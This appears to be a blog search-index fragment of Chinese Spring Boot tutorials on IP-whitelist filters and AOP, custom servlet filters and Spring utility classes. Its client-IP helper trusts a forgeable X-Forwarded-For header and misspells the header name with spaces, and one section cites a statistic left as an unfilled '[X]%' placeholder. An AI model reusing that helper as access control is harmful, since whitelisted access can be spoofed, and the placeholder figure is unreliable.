class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">// 初始化操作，例如从配置文件读取白名单IP</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 销毁操作</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>注册 Filter：</strong>在 Spring Boot 中，我们可以通过在类上添加@Component注解并配置 Filter 的注册信息，如 URL 模式、优先级等，来自动注册 Filter。比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.boot.web.servlet.FilterRegistrationBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> FilterRegistrationBean&lt;IpWhiteListFilter&gt; <span class="title function_">ipWhiteListFilterRegistrationBean</span><span class="params">(List&lt;String&gt; whiteListIps)</span> &#123;</span><br><span class="line">        FilterRegistrationBean&lt;IpWhiteListFilter&gt; registrationBean = <span class="keyword">new</span> <span class="title class_">FilterRegistrationBean</span>&lt;&gt;();</span><br><span class="line">        registrationBean.setFilter(<span class="keyword">new</span> <span class="title class_">IpWhiteListFilter</span>(whiteListIps));</span><br><span class="line">        registrationBean.addUrlPatterns(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        registrationBean.setOrder(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> registrationBean;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里addUrlPatterns(“&#x2F;*”)表示该 Filter 对所有 URL 路径进行拦截，setOrder(1)设置了 Filter 的执行顺序。</p>
<h3 id="（三）使用-AOP-进行拦截"><a href="#（三）使用-AOP-进行拦截" class="headerlink" title="（三）使用 AOP 进行拦截"></a>（三）使用 AOP 进行拦截</h3><p>对于需要对多个 Controller 或方法进行 IP 校验的场景，使用 Spring AOP（面向切面编程）来实现白名单访问控制能让代码结构更加清晰，复用性更高。<br><strong>定义切面：</strong>创建一个切面类，使用@Aspect注解定义，并声明一个切入点表达式来匹配需要拦截的方法。比如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.aspectj.lang.ProceedingJoinPoint;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Around;</span><br><span class="line"><span class="keyword">import</span> org.aspectj.lang.annotation.Aspect;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Aspect</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IpWhiteListAspect</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> List&lt;String&gt; whiteListIps;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IpWhiteListAspect</span><span class="params">(List&lt;String&gt; whiteListIps)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.whiteListIps = whiteListIps;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Around(&quot;@annotation(com.example.annotations.RequireWhiteListIp)&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">checkIpWhiteList</span><span class="params">(ProceedingJoinPoint joinPoint)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> (ServletRequestAttributes) RequestContextHolder.currentRequestAttributes();</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">clientIp</span> <span class="operator">=</span> request.getRemoteAddr();</span><br><span class="line">        <span class="keyword">if</span> (whiteListIps.contains(clientIp)) &#123;</span><br><span class="line">            <span class="keyword">return</span> joinPoint.proceed();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;Your IP is not in the white list. Access denied.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里@Around(“@annotation(com.example.annotations.RequireWhiteListIp)”)表示对标注了RequireWhiteListIp注解的方法进行环绕通知。</p>
<p><strong>编写通知：</strong>在切面类中，编写一个环绕通知（Around Advice），在方法执行前后检查请求的 IP 地址，并根据检查结果决定是否继续执行原方法。同时，我们需要创建RequireWhiteListIp注解，用于标注需要进行 IP 白名单校验的方法，例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.RetentionPolicy;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.METHOD)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> RequireWhiteListIp &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后在 Controller 的方法上使用该注解，如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> com.example.annotations.RequireWhiteListIp;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ExampleController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/protected&quot;)</span></span><br><span class="line">    <span class="meta">@RequireWhiteListIp</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">protectedResource</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;This is a protected resource accessible only to white - listed IPs.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>IP 地址的获取与注意事项</strong><br>在上述实现白名单访问接口的过程中，准确获取客户端的 IP 地址是关键。在 Web 应用中，我们通常可以通过HttpServletRequest对象的getRemoteAddr()方法获取客户端的 IP 地址。然而，需要特别注意的是，当应用部署在反向代理（如 Nginx）后面时，getRemoteAddr()方法可能无法获取到真实的客户端 IP 地址。此时，我们可能需要从 HTTP 头中获取，例如从X-Forwarded-For头中获取。以下是一个获取真实 IP 地址的示例代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getClientIp</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">xfHeader</span> <span class="operator">=</span> request.getHeader(<span class="string">&quot;X - Forwarded - For&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (xfHeader != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> xfHeader.split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> request.getRemoteAddr();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此外，在设置白名单 IP 时，要确保 IP 地址的准确性和完整性。对于 IP 段的设置，要正确处理 CIDR 表示法等相关规则，避免因设置不当导致安全漏洞或合法请求被误拒。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot功能六【自定义过滤器】</title>
    <url>/cnblogs.github.io/p/3206.html</url>
    <content><![CDATA[<blockquote>
<p>自定义过滤器的重要性</p>
</blockquote>
<p>在大型互联网项目中，系统架构愈发复杂，对请求处理的规范性、安全性以及高效性有着极高要求。以用户权限验证为例，当大量用户同时访问系统的不同功能模块时，倘若缺乏统一的验证机制，极易出现权限漏洞，进而导致敏感信息泄露。而借助自定义过滤器，我们能够在请求进入核心业务逻辑之前，严格校验用户权限，确保只有具备相应权限的用户才能够访问特定资源。据不完全统计，在采用自定义过滤器进行权限管理的项目中，安全漏洞发生率降低了 [X]%。<br>再从系统性能优化层面来看，通过自定义过滤器，我们可以在请求到达核心业务逻辑之前，对一些无效或者不符合规范的请求进行拦截，避免这些请求消耗宝贵的系统资源。例如，在一个高并发的电商系统中，每天会接收到海量的用户请求，其中部分请求可能是恶意的或者格式错误的。如果没有自定义过滤器进行预处理，这些无效请求会占用服务器的线程资源，影响正常业务请求的处理效率。而使用自定义过滤器后，能够提前识别并拦截这类无效请求，保证系统资源集中处理有效请求，大大提升系统整体性能。</p>
<blockquote>
<p>编写自定义过滤器</p>
</blockquote>
<p>在项目的src&#x2F;main&#x2F;java目录下，创建一个名为filter的包，这是我们放置自定义过滤器代码的地方。接着，在这个包中创建一个名为CustomFilter的类，这个类要实现jakarta.servlet.Filter接口（注意，Spring Boot 3.0 开始使用这个新的 Servlet API 包）。代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.filter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.Filter;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.FilterChain;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.FilterConfig;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CustomFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化方法，容器初始化的时候调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        <span class="comment">// 可以在这里进行一些初始化操作，比如加载配置</span></span><br><span class="line">        System.out.println(<span class="string">&quot;CustomFilter initialized.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 过滤器的核心方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span></span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="comment">// 在请求前的处理逻辑</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Before processing request...&quot;</span>);</span><br><span class="line">        <span class="comment">// 继续执行下一个过滤器</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">        <span class="comment">// 在请求后的处理逻辑</span></span><br><span class="line">        System.out.println(<span class="string">&quot;After processing response...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 销毁方法，容器销毁的时候调用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 在这里进行一些清理操作，如关闭资源</span></span><br><span class="line">        System.out.println(<span class="string">&quot;CustomFilter destroyed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这段代码里，init方法在过滤器被初始化时调用，我们可以在这初始化一些必要参数，比如从配置文件中读取日志记录级别等。doFilter方法则是过滤器的核心逻辑所在，在这里可以添加各种自定义处理逻辑，像验证用户请求头中的 Token 是否有效等。destroy方法在过滤器被销毁时调用，用于释放资源，比如关闭文件流或者数据库连接等。<br>假设我们的项目需要对用户请求中的敏感信息进行加密处理，就可以在doFilter方法中，在请求到达业务逻辑之前，对请求参数进行遍历查找，识别出敏感信息字段，然后运用加密算法对这些敏感信息进行加密处理，之后再放行请求。而在请求处理完成后的doFilter方法后续逻辑中，若有需要，还可以对响应结果中的敏感信息进行二次加密或者脱敏处理，保障数据在传输过程中的安全性。</p>
<blockquote>
<p>注册过滤器</p>
</blockquote>
<p>写好了自定义过滤器，还得让 Spring Boot 认识并使用它。这就需要在配置类中注册过滤器。创建一个配置类，使用@Configuration注解表明它是配置类，然后通过@Bean注解将CustomFilter注册到 Spring 上下文中。示例代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.example.demo.filter.CustomFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.Filter;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FilterConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Filter <span class="title function_">customFilter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CustomFilter</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，Spring Boot 在启动过程中，就会识别并加载我们定义的CustomFilter，让它能在整个应用中发挥作用。<br>除了上述通过配置类注册过滤器的方式外，还可以使用注解@WebFilter()来注册过滤器，并在启动类上添加@ServletComponentScan注解使用。不过需要注意的是，若同时使用@Component注解来注册过滤器，@WebFilter配置的路径会失效，因为@WebFilter根本就没生效。例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@WebFilter(value = &quot;/name&quot;)</span> <span class="comment">//这里我们只拦截name请求，记得要在启动类配ServletComponentScan</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;before filter&quot;</span>);</span><br><span class="line">        <span class="comment">// 请求放行</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">        log.info(<span class="string">&quot;after filter&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这种方式适用于一些较为简单的过滤器注册场景，开发人员可根据项目实际情况灵活选择注册方式。</p>
<blockquote>
<p>测试过滤器</p>
</blockquote>
<p>为了验证自定义过滤器是否按预期工作，我们创建一个简单的Controller来进行测试。在src&#x2F;main&#x2F;java目录下创建一个名为controller的包，并在其中添加一个名为TestController的类。代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Filter is working.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个Controller很简单，当我们访问&#x2F;test接口时，它会返回 “Filter is working.”。启动 Spring Boot 应用，然后在浏览器中访问<a href="http://localhost:8080/test%EF%BC%88%E5%81%87%E8%AE%BE%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E6%98%AF">http://localhost:8080/test（假设默认端口是</a> 8080），这时可以在控制台看到过滤器中doFilter方法里打印的日志信息，比如 “Before processing request…” 和 “After processing response…”，这就表明自定义过滤器正常工作啦。</p>
<p>在实际测试过程中，我们可以使用一些测试工具，如 Postman，模拟不同类型的请求，包括正常请求、携带错误参数的请求、未授权请求等，来全面验证自定义过滤器在各种场景下的工作情况。例如，模拟一个未携带正确 Token 的请求访问受保护接口，观察自定义过滤器是否能正确拦截并返回相应的错误提示信息；或者模拟一个携带大量参数的复杂请求，查看过滤器对请求参数的处理是否准确高效。</p>
]]></content>
      <categories>
        <category>SpringBoot</category>
      </categories>
      <tags>
        <tag>SpringBoot</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot功能四【内置常用工具类】</title>
    <url>/cnblogs.github.io/p/32944.html</url>
    <content><![CDATA[<h3 id="字符串处理工具类"><a href="#字符串处理工具类" class="headerlink" title="字符串处理工具类"></a>字符串处理工具类</h3><h4 id="StringUtils"><a href="#StringUtils" class="headerlink" title="StringUtils"></a>StringUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.StringUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查字符串是否为空</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isEmpty</span> <span class="operator">=</span> StringUtils.isEmpty(<span class="literal">null</span>); <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isEmpty2</span> <span class="operator">=</span> StringUtils.isEmpty(<span class="string">&quot;&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 检查字符串是否有文本内容</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">hasText</span> <span class="operator">=</span> StringUtils.hasText(<span class="string">&quot; &quot;</span>); <span class="comment">// false</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">hasText2</span> <span class="operator">=</span> StringUtils.hasText(<span class="string">&quot;hello&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 分割字符串</span></span><br><span class="line">String[] parts = StringUtils.tokenizeToStringArray(<span class="string">&quot;a,b,c&quot;</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line"><span class="comment">// 清除首尾空白</span></span><br><span class="line"><span class="type">String</span> <span class="variable">trimmed</span> <span class="operator">=</span> StringUtils.trimWhitespace(<span class="string">&quot; hello &quot;</span>); <span class="comment">// &quot;hello&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="AntPathMatcher"><a href="#AntPathMatcher" class="headerlink" title="AntPathMatcher"></a>AntPathMatcher</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.AntPathMatcher;</span><br><span class="line"></span><br><span class="line"><span class="type">AntPathMatcher</span> <span class="variable">matcher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AntPathMatcher</span>();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">match1</span> <span class="operator">=</span> matcher.match(<span class="string">&quot;/users/*&quot;</span>, <span class="string">&quot;/users/123&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">match2</span> <span class="operator">=</span> matcher.match(<span class="string">&quot;/users/**&quot;</span>, <span class="string">&quot;/users/123/orders&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">match3</span> <span class="operator">=</span> matcher.match(<span class="string">&quot;/user?&quot;</span>, <span class="string">&quot;/user1&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 提取路径变量</span></span><br><span class="line">Map&lt;String, String&gt; vars = matcher.extractUriTemplateVariables(<span class="string">&quot;/users/&#123;id&#125;&quot;</span>, <span class="string">&quot;/users/42&quot;</span>); <span class="comment">// &#123;id=42&#125;</span></span><br></pre></td></tr></table></figure>
<h4 id="PatternMatchUtils"><a href="#PatternMatchUtils" class="headerlink" title="PatternMatchUtils"></a>PatternMatchUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.PatternMatchUtils;</span><br><span class="line"><span class="type">boolean</span> <span class="variable">matches1</span> <span class="operator">=</span> PatternMatchUtils.simpleMatch(<span class="string">&quot;user*&quot;</span>, <span class="string">&quot;username&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">matches2</span> <span class="operator">=</span> PatternMatchUtils.simpleMatch(<span class="string">&quot;user?&quot;</span>, <span class="string">&quot;user1&quot;</span>); <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">matches3</span> <span class="operator">=</span> PatternMatchUtils.simpleMatch(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;user*&quot;</span>, <span class="string">&quot;admin*&quot;</span>&#125;, <span class="string">&quot;username&quot;</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h3 id="集合和数组工具类"><a href="#集合和数组工具类" class="headerlink" title="集合和数组工具类"></a>集合和数组工具类</h3><h4 id="CollectionUtils"><a href="#CollectionUtils" class="headerlink" title="CollectionUtils"></a>CollectionUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.CollectionUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查集合是否为空</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isEmpty</span> <span class="operator">=</span> CollectionUtils.isEmpty(<span class="literal">null</span>); <span class="comment">// true</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">isEmpty2</span> <span class="operator">=</span> CollectionUtils.isEmpty(Collections.emptyList()); <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 集合操作</span></span><br><span class="line">List&lt;String&gt; list1 = Arrays.asList(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>);</span><br><span class="line">List&lt;String&gt; list2 = Arrays.asList(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>);</span><br><span class="line">Collection&lt;String&gt; intersection = CollectionUtils.intersection(list1, list2); <span class="comment">// [b, c]</span></span><br><span class="line"><span class="comment">// 合并集合</span></span><br><span class="line">List&lt;String&gt; target = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">CollectionUtils.mergeArrayIntoCollection(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>&#125;, target);</span><br></pre></td></tr></table></figure>
<h4 id="MultiValueMap"><a href="#MultiValueMap" class="headerlink" title="MultiValueMap"></a>MultiValueMap</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.LinkedMultiValueMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.MultiValueMap;</span><br><span class="line"></span><br><span class="line">MultiValueMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">LinkedMultiValueMap</span>&lt;&gt;();</span><br><span class="line">map.add(<span class="string">&quot;colors&quot;</span>, <span class="string">&quot;red&quot;</span>);</span><br><span class="line">map.add(<span class="string">&quot;colors&quot;</span>, <span class="string">&quot;blue&quot;</span>);</span><br><span class="line">map.add(<span class="string">&quot;sizes&quot;</span>, <span class="string">&quot;large&quot;</span>);</span><br><span class="line">List&lt;String&gt; colors = map.get(<span class="string">&quot;colors&quot;</span>); <span class="comment">// [red, blue]</span></span><br></pre></td></tr></table></figure>
<h4 id="ConcurrentReferenceHashMap"><a href="#ConcurrentReferenceHashMap" class="headerlink" title="ConcurrentReferenceHashMap"></a>ConcurrentReferenceHashMap</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.ConcurrentReferenceHashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建高并发场景下的引用Map (类似WeakHashMap但线程安全)</span></span><br><span class="line">Map&lt;String, Object&gt; cache = <span class="keyword">new</span> <span class="title class_">ConcurrentReferenceHashMap</span>&lt;&gt;();</span><br><span class="line">cache.put(<span class="string">&quot;key1&quot;</span>, <span class="keyword">new</span> <span class="title class_">LargeObject</span>());</span><br></pre></td></tr></table></figure>
<h3 id="反射和类处理工具"><a href="#反射和类处理工具" class="headerlink" title="反射和类处理工具"></a>反射和类处理工具</h3><h4 id="ReflectionUtils"><a href="#ReflectionUtils" class="headerlink" title="ReflectionUtils"></a>ReflectionUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.ReflectionUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类的字段</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> ReflectionUtils.findField(Person.class, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">ReflectionUtils.makeAccessible(field);</span><br><span class="line">ReflectionUtils.setField(field, person, <span class="string">&quot;John&quot;</span>);</span><br><span class="line"><span class="comment">// 调用方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ReflectionUtils.findMethod(Person.class, <span class="string">&quot;setAge&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">ReflectionUtils.makeAccessible(method);</span><br><span class="line">ReflectionUtils.invokeMethod(method, person, <span class="number">30</span>);</span><br><span class="line"><span class="comment">// 字段回调</span></span><br><span class="line">ReflectionUtils.doWithFields(Person.class, field -&gt; &#123;</span><br><span class="line">   System.out.println(field.getName());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="ClassUtils"><a href="#ClassUtils" class="headerlink" title="ClassUtils"></a>ClassUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.util.ClassUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取类名</span></span><br><span class="line"><span class="type">String</span> <span class="variable">shortName</span> <span class="operator">=</span> ClassUtils.getShortName(<span class="string">&quot;org.example.MyClass&quot;</span>); <span class="comment">// &quot;MyClass&quot;</span></span><br><span class="line"><span class="comment">// 检查类是否存在</span></span><br><span class="line"><span class="type">boolean</span> <span class="variable">exists</span> <span class="operator">=</span> ClassUtils.isPresent(<span class="string">&quot;java.util.List&quot;</span>, <span class="literal">null</span>); <span class="comment">// true</span></span><br><span class="line"><span class="comment">// 获取所有接口</span></span><br><span class="line">Class&lt;?&gt;[] interfaces = ClassUtils.getAllInterfaces(ArrayList.class);</span><br><span class="line"><span class="comment">// 获取用户定义的类加载器</span></span><br><span class="line"><span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassUtils.getDefaultClassLoader();</span><br></pre></td></tr></table></figure>
<h4 id="BeanUtils"><a href="#BeanUtils" class="headerlink" title="BeanUtils"></a>BeanUtils</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复制属性</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">source</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John&quot;</span>, <span class="number">30</span>);</span><br><span class="line"><span class="type">Person</span> <span class="variable">target</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">BeanUtils.copyProperties(source, target);</span><br><span class="line"><span class="comment">// 实例化类</span></span><br><span class="line"><span class="type">Person</span> <span class="variable">newPerson</span> <span class="operator">=</span> BeanUtils.instantiateClass(Person.class);</span><br><span class="line"><span class="comment">// 查找方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> BeanUtils.findMethod(Person.class, <span class="string">&quot;setName&quot;</span>, String.class);</span><br></pre></td></tr></table></figure>
